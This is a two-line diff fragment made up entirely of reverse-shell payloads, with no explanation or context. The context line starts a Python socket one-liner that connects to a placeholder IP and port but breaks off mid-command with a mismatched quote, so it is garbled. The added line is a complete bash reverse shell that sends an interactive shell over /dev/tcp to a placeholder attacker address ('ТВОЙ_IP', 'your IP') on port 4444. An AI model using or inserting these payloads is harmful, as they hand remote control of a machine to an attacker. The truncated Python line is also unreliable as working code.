@@ -1,1 +1,2 @@
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>”,<Port number>))
+/bin/bash -c 'bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1' #
